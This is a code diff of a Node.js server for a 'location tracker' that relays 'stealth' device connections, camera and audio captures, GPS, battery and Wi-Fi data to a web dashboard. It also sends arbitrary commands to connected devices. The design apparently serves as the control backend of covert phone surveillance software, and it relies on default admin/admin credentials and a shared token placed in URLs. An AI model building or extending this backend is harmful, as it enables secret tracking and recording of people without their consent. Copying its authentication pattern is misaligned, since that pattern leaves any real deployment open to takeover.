@@ -1,521 +1,500 @@
+// server.js
 import express from "express";
 import bodyParser from "body-parser";
 import cors from "cors";
 import { createClient } from "@supabase/supabase-js";
-import { WebSocketServer } from 'ws';
-import http from 'http';
+import { WebSocketServer, WebSocket } from "ws";
+import http from "http";
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('Starting location tracker server...');
+console.log("Starting location tracker server...");
 
-// Создаем HTTP сервер
+// Create HTTP server
 const server = http.createServer(app);
 
-// === Supabase подключение ===
+// === Supabase ===
 const supabaseUrl = process.env.SUPABASE_URL || "https://hapwopjrgwdjwfawpjwq.supabase.co";
 const supabaseKey = process.env.SUPABASE_ANON_KEY;
 
-// === Config Auth ===
 const ADMIN_USER = process.env.ADMIN_USER || "admin";
 const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
 const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";
 
-console.log('Configuration:');
-console.log('- Supabase URL:', supabaseUrl);
-console.log('- Admin User:', ADMIN_USER);
-console.log('- Secret Token:', SECRET_TOKEN);
+console.log("Configuration:");
+console.log("- Supabase URL:", supabaseUrl);
+console.log("- Admin User:", ADMIN_USER);
+// NOTE: avoid logging SECRET_TOKEN in production
 
-// Проверка наличия ключей
 if (!supabaseUrl || !supabaseKey) {
-    console.error('Missing Supabase credentials');
-    process.exit(1);
+  console.error("Missing Supabase credentials");
+  process.exit(1);
 }
 
 const supabase = createClient(supabaseUrl, supabaseKey);
 
 // === Middlewares ===
 app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.json({ limit: "50mb" }));
 app.use(express.static("public"));
 
-// === WebSocket Setup ===
-const activeConnections = new Map();
-const webClients = new Set();
+// === WebSocket setup (single server, supports legacy path) ===
+const stealthConnections = new Map(); // deviceId -> { ws, lastSeen }
+const webClients = new Set(); // Set<WebSocket>
 
-// WebSocket для устройств - используем noServer
-console.log('Initializing device WebSocket server...');
-const wss = new WebSocketServer({ 
-    noServer: true
-});
+const wss = new WebSocketServer({ noServer: true });
 
-// WebSocket для веб-клиентов
-console.log('Initializing web client WebSocket server...');
-const webWss = new WebSocketServer({ 
-    noServer: true
-});
+// Only accept upgrades for our WS paths; reject everything else
+server.on("upgrade", (request, socket, head) => {
+  try {
+    const url = new URL(request.url, `http://${request.headers.host}`);
+    const pathname = url.pathname || "";
 
-// Обработчик upgrade для WebSocket
-server.on('upgrade', (request, socket, head) => {
-    console.log('WebSocket upgrade request received:', request.url);
-    
-    if (request.url.startsWith('/ws/stealth')) {
-        console.log('Handling device WebSocket upgrade...');
-        wss.handleUpgrade(request, socket, head, (ws) => {
-            console.log('Device WebSocket upgraded successfully');
-            
-            // Обрабатываем подключение устройства
-            const url = new URL(request.url, `http://${request.headers.host}`);
-            const deviceId = url.pathname.split('/').pop();
-            
-            console.log(`Device connected: ${deviceId}`);
-            activeConnections.set(deviceId, ws);
-            
-            ws.on('message', (data) => {
-                try {
-                    const message = JSON.parse(data.toString());
-                    console.log(`Message from ${deviceId}:`, message.type);
-                    broadcastToWebClients(deviceId, message);
-                } catch (error) {
-                    console.error('WebSocket message error:', error);
-                }
-            });
-            
-            ws.on('close', () => {
-                activeConnections.delete(deviceId);
-                console.log(`Device ${deviceId} disconnected`);
-            });
-            
-            ws.on('error', (error) => {
-                console.error('Device WebSocket error:', error);
-            });
-        });
-    } else if (request.url.startsWith('/ws/live')) {
-        console.log('Handling web client WebSocket upgrade...');
-        webWss.handleUpgrade(request, socket, head, (ws) => {
-            console.log('Web client WebSocket upgraded successfully');
-            
-            webClients.add(ws);
-            console.log('Web client connected');
-            
-            ws.on('close', () => {
-                webClients.delete(ws);
-                console.log('Web client disconnected');
-            });
-            
-            ws.on('error', (error) => {
-                console.error('Web client WebSocket error:', error);
-            });
-        });
+    if (pathname.startsWith("/ws/live") || pathname.startsWith("/ws/stealth")) {
+      wss.handleUpgrade(request, socket, head, (ws) => {
+        wss.emit("connection", ws, request);
+      });
     } else {
-        console.log('Unknown WebSocket path:', request.url);
-        socket.destroy();
+      // Unknown path -> reject connection
+      socket.destroy();
     }
+  } catch (err) {
+    socket.destroy();
+  }
 });
 
-function broadcastToWebClients(deviceId, message) {
-    const data = JSON.stringify({
-        deviceId,
-        ...message
-    });
-    
-    console.log(`Broadcasting to ${webClients.size} web clients from device ${deviceId}`);
-    
-    webClients.forEach(client => {
-        if (client.readyState === 1) { // WebSocket.OPEN
-            try {
-                client.send(data);
-            } catch (error) {
-                console.error('Error sending to web client:', error);
-            }
-        }
-    });
+// Helper: broadcast object message to all web clients (JSON)
+function broadcastToWebClients(obj) {
+  const payload = JSON.stringify(obj);
+  for (const client of webClients) {
+    try {
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(payload);
+      }
+    } catch (e) {
+      console.error("Error sending to web client:", e);
+    }
+  }
 }
 
-// === API ENDPOINTS ===
+// Main connection handler
+wss.on("connection", (ws, req) => {
+  const url = new URL(req.url, `http://${req.headers.host}`);
+  const pathname = url.pathname || "";
 
-// Логин
-app.post("/api/login", (req, res) => {
-    const { username, password } = req.body;
-    
-    console.log('Login attempt:', username);
-    
-    if (username === ADMIN_USER && password === ADMIN_PASS) {
-        res.json({ 
-            success: true, 
-            token: SECRET_TOKEN 
-        });
-    } else {
-        res.status(401).json({ 
-            success: false, 
-            error: 'Invalid credentials' 
-        });
-    }
-});
+  // Try query param first: /ws/live?deviceId=...
+  let deviceId = url.searchParams.get("deviceId") || null;
 
-// Команды для устройств
-app.post('/api/device/command', (req, res) => {
-    const { device_id, command, token } = req.body;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-    
-    const deviceConnection = activeConnections.get(device_id);
-    if (deviceConnection && deviceConnection.readyState === 1) {
-        deviceConnection.send(JSON.stringify({
-            action: command,
+  // Support legacy path: /ws/stealth/{deviceId}
+  if (!deviceId && pathname.startsWith("/ws/stealth")) {
+    const parts = pathname.split("/").filter(Boolean); // removes empty parts
+    deviceId = parts[parts.length - 1] || null;
+  }
+
+  // If path is /ws/live and no deviceId -> treat as web client
+  const isLivePath = pathname.startsWith("/ws/live") || pathname.startsWith("/ws/stealth") || pathname === "/ws/live";
+
+  if (!isLivePath) {
+    // Shouldn't happen because server.on('upgrade') filtered, but be safe:
+    ws.close(1008, "Unsupported WebSocket path");
+    return;
+  }
+
+  if (deviceId) {
+    // --- Device connection ---
+    ws.deviceId = deviceId;
+    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
+    console.log(`Device ${deviceId} connected via WS (path ${pathname})`);
+
+    ws.on("message", (rawData) => {
+      try {
+        // rawData may be string or Buffer
+        if (typeof rawData === "string") {
+          // assume JSON
+          const msg = JSON.parse(rawData);
+          const type = msg.type || "message";
+          const data = msg.data ?? null;
+          const timestamp = msg.timestamp ?? Date.now();
+
+          // Build broadcast payload
+          const broadcast = {
+            type,
+            deviceId,
+            data,
+            timestamp,
+            meta: msg.meta ?? null
+          };
+
+          // If device explicitly sends image/audio as base64 inside msg.data, it's forwarded
+          broadcastToWebClients(broadcast);
+          console.log(`Broadcasted ${type} from ${deviceId} to ${webClients.size} web clients`);
+        } else if (Buffer.isBuffer(rawData)) {
+          // Binary frame received — convert to base64 and forward as JSON with encoding hint
+          const b64 = rawData.toString("base64");
+          const broadcast = {
+            type: "binary",
+            encoding: "base64",
+            deviceId,
+            data: b64,
             timestamp: Date.now()
-        }));
-        
-        console.log(`Command sent to device ${device_id}: ${command}`);
-        res.json({ success: true, command_sent: command });
-    } else {
-        console.log(`Device ${device_id} not connected`);
-        res.status(404).json({ error: "Device not connected" });
-    }
-});
-
-// Прием изображений через HTTP (fallback)
-app.post('/api/camera/image', (req, res) => {
-    const receivedToken = req.headers.authorization;
-    
-    if (receivedToken !== SECRET_TOKEN) {
-        console.log('Unauthorized image request:', receivedToken);
-        return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
-    const { type, device_id, data, timestamp } = req.body;
-    
-    console.log(`Received ${type} from device ${device_id} via HTTP`);
-    
-    // Пересылаем всем веб-клиентам
-    broadcastToWebClients(device_id, { 
-        type, 
-        data, 
-        timestamp: timestamp || Date.now() 
-    });
-    
-    res.json({ success: true });
-});
-
-// Удаление устройства
-app.delete("/api/device/:device_id/:token", async (req, res) => {
-    const { device_id, token } = req.params;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-
-    try {
-        const { error } = await supabase
-            .from("locations")
-            .delete()
-            .eq("device_id", device_id);
-
-        if (error) throw error;
-        
-        console.log(`Device ${device_id} deleted`);
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('Delete device error:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// Переименование устройства
-app.post("/api/device/:device_id/rename/:token", async (req, res) => {
-    const { device_id, token } = req.params;
-    const { name } = req.body;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-
-    try {
-        const { error } = await supabase
-            .from("locations")
-            .update({ device_name: name })
-            .eq("device_id", device_id);
-
-        if (error) throw error;
-        
-        console.log(`Device ${device_id} renamed to ${name}`);
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('Rename device error:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// Получение файлов устройства (заглушка)
-app.get("/api/device/:device_id/files/:token", (req, res) => {
-    const { device_id, token } = req.params;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-    
-    // Заглушка - возвращаем пустой список файлов
-    res.json({
-        device_id,
-        files: []
-    });
-});
-
-// Прием данных локации
-app.post("/api/location", async (req, res) => {
-    const receivedToken = req.headers.authorization;
-
-    if (receivedToken !== SECRET_TOKEN) {
-        console.log('Unauthorized location request:', receivedToken);
-        return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
-    const { device_id, device_name, latitude, longitude, timestamp, accuracy, battery, wifi_info } = req.body;
-    
-    if (!validateGPSPoint(latitude, longitude, accuracy)) {
-        return res.status(400).json({ error: "Invalid GPS coordinates" });
-    }
-    
-    // Преобразуем timestamp в число
-    let timestampValue;
-    if (typeof timestamp === 'string') {
-        timestampValue = new Date(timestamp).getTime();
-    } else {
-        timestampValue = timestamp;
-    }
-    
-    try {
-        const { error } = await supabase
-            .from('locations')
-            .insert([{
-                device_id,
-                device_name,
-                latitude: parseFloat(latitude),
-                longitude: parseFloat(longitude),
-                timestamp: timestampValue,
-                accuracy: parseFloat(accuracy),
-                battery: parseInt(battery),
-                wifi_info: wifi_info || null
-            }]);
-            
-        if (error) {
-            console.error('Supabase error:', error);
-            return res.status(500).json({ error: 'Database error' });
+          };
+          broadcastToWebClients(broadcast);
+          console.log(`Broadcasted binary frame from ${deviceId} as base64 to ${webClients.size} web clients`);
+        } else {
+          console.warn("Unknown message type from device:", typeof rawData);
         }
-        
-        console.log(`Location saved for device ${device_id}`);
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('Location save error:', error);
-        res.status(500).json({ error: 'Server error' });
-    }
+      } catch (err) {
+        console.error("Error processing device message:", err);
+      }
+    });
+
+    ws.on("close", () => {
+      stealthConnections.delete(deviceId);
+      console.log(`Device ${deviceId} disconnected`);
+    });
+
+    ws.on("error", (err) => {
+      console.error(`Device WebSocket error (${deviceId}):`, err);
+    });
+
+  } else {
+    // --- Web client connection ---
+    webClients.add(ws);
+    console.log(`Web client connected. Total web clients: ${webClients.size}`);
+
+    ws.on("message", (msg) => {
+      // Optionally handle web-client messages (e.g., requesting actions)
+      // For now, just log small messages
+      try {
+        // if needed, parse JSON
+        // const parsed = JSON.parse(msg.toString());
+      } catch (e) {
+        // ignore non-json
+      }
+    });
+
+    ws.on("close", () => {
+      webClients.delete(ws);
+      console.log(`Web client disconnected. Total web clients: ${webClients.size}`);
+    });
+
+    ws.on("error", (err) => {
+      console.error("Web client WebSocket error:", err);
+    });
+  }
 });
 
-// Получение списка устройств
+// WS server-level errors
+wss.on("error", (err) => {
+  console.error("WebSocket server error:", err);
+});
+
+// ===== API endpoints (full) =====
+
+// Login
+app.post("/api/login", (req, res) => {
+  const { username, password } = req.body;
+  console.log("Login attempt:", username);
+  if (username === ADMIN_USER && password === ADMIN_PASS) {
+    return res.json({ success: true, token: SECRET_TOKEN });
+  }
+  return res.status(401).json({ success: false, error: "Invalid credentials" });
+});
+
+// Send command to device
+app.post("/api/device/command", (req, res) => {
+  const { device_id, command, token } = req.body;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
+
+  const entry = stealthConnections.get(device_id);
+  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
+    try {
+      entry.ws.send(JSON.stringify({ action: command, timestamp: Date.now() }));
+      console.log(`Command sent to device ${device_id}: ${command}`);
+      return res.json({ success: true, command_sent: command });
+    } catch (err) {
+      console.error("Error sending command to device:", err);
+      return res.status(500).json({ error: "Failed to send command" });
+    }
+  } else {
+    console.log(`Device ${device_id} not connected`);
+    return res.status(404).json({ error: "Device not connected" });
+  }
+});
+
+// Fallback image upload via HTTP
+app.post("/api/camera/image", (req, res) => {
+  const token = req.headers.authorization;
+  if (token !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });
+
+  const { type, device_id, data, timestamp } = req.body;
+  console.log(`Received ${type} from device ${device_id} via HTTP fallback`);
+
+  const broadcast = {
+    type,
+    deviceId: device_id,
+    data,
+    timestamp: timestamp || Date.now()
+  };
+  broadcastToWebClients(broadcast);
+
+  return res.json({ success: true });
+});
+
+// Delete device locations
+app.delete("/api/device/:device_id/:token", async (req, res) => {
+  const { device_id, token } = req.params;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
+
+  try {
+    const { error } = await supabase.from("locations").delete().eq("device_id", device_id);
+    if (error) throw error;
+
+    console.log(`Device ${device_id} deleted from DB`);
+    return res.json({ success: true });
+  } catch (err) {
+    console.error("Delete device error:", err);
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Rename device
+app.post("/api/device/:device_id/rename/:token", async (req, res) => {
+  const { device_id, token } = req.params;
+  const { name } = req.body;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
+
+  try {
+    const { error } = await supabase.from("locations").update({ device_name: name }).eq("device_id", device_id);
+    if (error) throw error;
+
+    console.log(`Device ${device_id} renamed to ${name}`);
+    return res.json({ success: true });
+  } catch (err) {
+    console.error("Rename device error:", err);
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Files (stub)
+app.get("/api/device/:deviceId/files/:token", (req, res) => {
+  const { deviceId, token } = req.params;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
+
+  // TODO: hook into real file storage (Supabase Storage / S3 / etc.)
+  return res.json({
+    deviceId,
+    files: [
+      { name: "camera_capture_001.jpg", type: "image", size: "2.4 MB", date: new Date().toISOString() },
+      { name: "audio_record_001.mp3", type: "audio", size: "1.1 MB", date: new Date().toISOString() }
+    ]
+  });
+});
+
+// Receive location
+app.post("/api/location", async (req, res) => {
+  const receivedToken = req.headers.authorization;
+  if (receivedToken !== SECRET_TOKEN) {
+    console.log("Unauthorized location request:", receivedToken);
+    return res.status(401).json({ error: "Unauthorized" });
+  }
+
+  const { device_id, device_name, latitude, longitude, timestamp, accuracy, battery, wifi_info } = req.body;
+
+  if (!validateGPSPoint(latitude, longitude, accuracy)) {
+    return res.status(400).json({ error: "Invalid GPS coordinates" });
+  }
+
+  let timestampValue = typeof timestamp === "string" ? new Date(timestamp).getTime() : timestamp;
+
+  try {
+    const { error } = await supabase.from("locations").insert([{
+      device_id,
+      device_name,
+      latitude: parseFloat(latitude),
+      longitude: parseFloat(longitude),
+      timestamp: timestampValue,
+      accuracy: parseFloat(accuracy),
+      battery: battery != null ? parseInt(battery) : null,
+      wifi_info: wifi_info || null
+    }]);
+
+    if (error) {
+      console.error("Supabase error:", error);
+      return res.status(500).json({ error: "Database error" });
+    }
+
+    console.log(`Location saved for device ${device_id}`);
+
+    // Optional: broadcast new location immediately to web clients
+    broadcastToWebClients({
+      type: "location",
+      deviceId: device_id,
+      data: { latitude: parseFloat(latitude), longitude: parseFloat(longitude), accuracy: parseFloat(accuracy), battery: battery },
+      timestamp: timestampValue || Date.now()
+    });
+
+    return res.json({ success: true });
+  } catch (err) {
+    console.error("Location save error:", err);
+    return res.status(500).json({ error: "Server error" });
+  }
+});
+
+// Get devices list
 app.get("/api/devices/:token", async (req, res) => {
-    const { token } = req.params;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-    
-    try {
-        const { data, error } = await supabase
-            .from('locations')
-            .select(`
-                device_id,
-                device_name,
-                latitude,
-                longitude,
-                timestamp,
-                battery,
-                accuracy
-            `)
-            .order('timestamp', { ascending: false });
-            
-        if (error) throw error;
-        
-        // Группируем по устройствам
-        const devices = {};
-        data.forEach(location => {
-            if (!devices[location.device_id]) {
-                devices[location.device_id] = {
-                    device_id: location.device_id,
-                    device_name: location.device_name,
-                    last_seen: location.timestamp,
-                    battery: location.battery,
-                    location_count: 0,
-                    last_location: {
-                        lat: location.latitude,
-                        lng: location.longitude
-                    },
-                    is_connected: activeConnections.has(location.device_id)
-                };
-            }
-            devices[location.device_id].location_count++;
-        });
-        
-        console.log(`Returned ${Object.keys(devices).length} devices`);
-        res.json(Object.values(devices));
-        
-    } catch (error) {
-        console.error('Database error:', error);
-        res.status(500).json({ error: 'Database error' });
-    }
+  const { token } = req.params;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
+
+  try {
+    const { data, error } = await supabase
+      .from("locations")
+      .select("device_id, device_name, latitude, longitude, timestamp, battery, accuracy")
+      .order("timestamp", { ascending: false });
+
+    if (error) throw error;
+
+    const devices = {};
+    data.forEach((location) => {
+      if (!devices[location.device_id]) {
+        devices[location.device_id] = {
+          device_id: location.device_id,
+          device_name: location.device_name,
+          last_seen: location.timestamp,
+          battery: location.battery,
+          location_count: 0,
+          last_location: { lat: location.latitude, lng: location.longitude },
+          is_connected: stealthConnections.has(location.device_id)
+        };
+      }
+      devices[location.device_id].location_count++;
+    });
+
+    console.log(`Returned ${Object.keys(devices).length} devices`);
+    return res.json(Object.values(devices));
+  } catch (err) {
+    console.error("Database error:", err);
+    return res.status(500).json({ error: "Database error" });
+  }
 });
 
-// Получение данных конкретного устройства
+// Get specific device data
 app.get("/api/device/:deviceId/:token", async (req, res) => {
-    const { deviceId, token } = req.params;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-    
-    try {
-        const { data, error } = await supabase
-            .from('locations')
-            .select('*')
-            .eq('device_id', deviceId)
-            .order('timestamp', { ascending: true })
-            .limit(1000);
-            
-        if (error) throw error;
-        
-        const device = data.length > 0 ? data[0] : null;
-        
-        // Фильтруем дубликаты
-        const filteredLocations = filterDuplicatePoints(data.filter(loc => 
-            validateGPSPoint(loc.latitude, loc.longitude, loc.accuracy)
-        ));
-        
-        res.json({
-            device_id: deviceId,
-            device_name: device?.device_name || 'Unknown Device',
-            locations: filteredLocations,
-            total_points: data.length,
-            is_connected: activeConnections.has(deviceId)
-        });
-        
-    } catch (error) {
-        console.error('Database error:', error);
-        res.status(500).json({ error: 'Database error' });
-    }
+  const { deviceId, token } = req.params;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
+
+  try {
+    const { data, error } = await supabase
+      .from("locations")
+      .select("*")
+      .eq("device_id", deviceId)
+      .order("timestamp", { ascending: true })
+      .limit(1000);
+
+    if (error) throw error;
+
+    const filteredLocations = filterDuplicatePoints(
+      data.filter((loc) => validateGPSPoint(loc.latitude, loc.longitude, loc.accuracy))
+    );
+
+    return res.json({
+      device_id: deviceId,
+      device_name: data[0]?.device_name || "Unknown Device",
+      locations: filteredLocations,
+      total_points: data.length,
+      is_connected: stealthConnections.has(deviceId)
+    });
+  } catch (err) {
+    console.error("Database error:", err);
+    return res.status(500).json({ error: "Database error" });
+  }
 });
 
 // Analytics
 app.get("/api/analytics/:device_id/:token", async (req, res) => {
-    const { device_id, token } = req.params;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-    
-    const days = parseInt(req.query.days) || 7;
+  const { device_id, token } = req.params;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
 
-    try {
-        const { data: locations, error } = await supabase
-            .from("locations")
-            .select("device_id, device_name, latitude, longitude, timestamp, battery")
-            .eq("device_id", device_id)
-            .order("timestamp", { ascending: true })
-            .limit(500);
+  const days = parseInt(req.query.days) || 7;
 
-        if (error) throw error;
+  try {
+    const { data: locations, error } = await supabase
+      .from("locations")
+      .select("device_id, device_name, latitude, longitude, timestamp, battery")
+      .eq("device_id", device_id)
+      .order("timestamp", { ascending: true })
+      .limit(500);
 
-        res.json({
-            device_id,
-            device_name: locations[0]?.device_name || 'Unknown Device',
-            period_days: days,
-            total_points: locations.length,
-            locations: locations.slice(-100)
-        });
-        
-    } catch (error) {
-        console.error('Analytics error:', error);
-        res.status(500).json({ error: 'Analytics error' });
-    }
+    if (error) throw error;
+
+    return res.json({
+      device_id,
+      device_name: locations[0]?.device_name || "Unknown Device",
+      period_days: days,
+      total_points: locations.length,
+      locations: locations.slice(-100)
+    });
+  } catch (err) {
+    console.error("Analytics error:", err);
+    return res.status(500).json({ error: "Analytics error" });
+  }
 });
 
-// Статические файлы
-app.get('/', (req, res) => {
-    res.sendFile('index.html', { root: 'public' });
+// Static index
+app.get("/", (req, res) => {
+  res.sendFile("index.html", { root: "public" });
 });
 
-// === Utility Functions ===
+// === Utility functions ===
 function validateGPSPoint(lat, lng, accuracy) {
-    if (!lat || !lng || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
-        return false;
-    }
-    if (accuracy && accuracy > 100) {
-        return false;
-    }
-    return true;
+  if (lat === undefined || lng === undefined) return false;
+  const nLat = parseFloat(lat);
+  const nLng = parseFloat(lng);
+  if (Number.isNaN(nLat) || Number.isNaN(nLng)) return false;
+  if (nLat < -90 || nLat > 90 || nLng < -180 || nLng > 180) return false;
+  if (accuracy && parseFloat(accuracy) > 100) return false;
+  return true;
 }
 
 function filterDuplicatePoints(locations, minDistance = 10) {
-    if (locations.length < 2) return locations;
+  if (!locations || locations.length < 2) return locations;
+  const filtered = [locations[0]];
 
-    const filtered = [locations[0]];
+  for (let i = 1; i < locations.length; i++) {
+    const prev = filtered[filtered.length - 1];
+    const curr = locations[i];
 
-    for (let i = 1; i < locations.length; i++) {
-        const prev = filtered[filtered.length - 1];
-        const curr = locations[i];
+    const distance = getDistance(
+      parseFloat(prev.latitude), parseFloat(prev.longitude),
+      parseFloat(curr.latitude), parseFloat(curr.longitude)
+    );
 
-        const distance = getDistance(
-            parseFloat(prev.latitude), parseFloat(prev.longitude),
-            parseFloat(curr.latitude), parseFloat(curr.longitude)
-        );
+    if (distance > minDistance) filtered.push(curr);
+  }
 
-        if (distance > minDistance) {
-            filtered.push(curr);
-        }
-    }
-
-    return filtered;
+  return filtered;
 }
 
 function getDistance(lat1, lon1, lat2, lon2) {
-    const R = 6371e3;
-    const φ1 = lat1 * Math.PI / 180;
-    const φ2 = lat2 * Math.PI / 180;
-    const Δφ = (lat2 - lat1) * Math.PI / 180;
-    const Δλ = (lon2 - lon1) * Math.PI / 180;
-
-    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
-              Math.cos(φ1) * Math.cos(φ2) *
-              Math.sin(Δλ/2) * Math.sin(Δλ/2);
-    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-
-    return R * c;
+  const R = 6371e3; // metres
+  const φ1 = lat1 * Math.PI / 180;
+  const φ2 = lat2 * Math.PI / 180;
+  const Δφ = (lat2 - lat1) * Math.PI / 180;
+  const Δλ = (lon2 - lon1) * Math.PI / 180;
+  const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
+            Math.cos(φ1) * Math.cos(φ2) *
+            Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+  return R * c;
 }
 
-// Обработка ошибок WebSocket
-wss.on('error', (error) => {
-    console.error('Device WebSocket Server error:', error);
-});
-
-webWss.on('error', (error) => {
-    console.error('Web Client WebSocket Server error:', error);
-});
-
-// Запуск сервера
+// Start server
 server.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log('WebSocket servers initialized:');
-    console.log('- Device WebSocket: /ws/stealth');
-    console.log('- Web Client WebSocket: /ws/live');
-    console.log('Available endpoints:');
-    console.log('- POST /api/login');
-    console.log('- POST /api/location');
-    console.log('- POST /api/camera/image');
-    console.log('- GET /api/devices/:token');
-    console.log('Server ready for connections!');
+  console.log(`Server running on port ${PORT}`);
+  console.log("WebSocket endpoints:");
+  console.log("- Unified: /ws/live (web clients: ws://host/ws/live)");
+  console.log("- Devices (query param): ws://host/ws/live?deviceId=SYS123");
+  console.log("- Legacy devices path: ws://host/ws/stealth/SYS123");
+  console.log("Available endpoints: /api/login, /api/location, /api/camera/image, /api/devices/:token, etc.");
 });
-
